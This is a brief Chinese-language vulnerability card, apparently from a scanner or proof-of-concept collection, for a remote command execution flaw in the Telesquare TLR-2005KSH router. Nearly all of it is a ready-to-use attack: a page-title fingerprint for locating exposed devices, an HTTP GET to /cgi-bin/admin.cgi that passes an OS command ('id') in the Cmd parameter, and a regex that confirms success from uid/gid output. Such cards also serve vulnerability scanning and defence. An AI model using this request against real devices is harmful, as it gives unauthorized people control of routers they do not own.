# TelesquareTLR-2005Ksh远程命令执行漏洞

TelesquareTLR ｜ 命令执行 ｜ —
- **指纹**：`title="Login to TLR-2005KSH"`
- **请求**：`GET /cgi-bin/admin.cgi?Command=sysCommand&Cmd=id HTTP/1.1`
- **响应特征**：200 ^(?=.*?uid)(?=.*?gid).*?$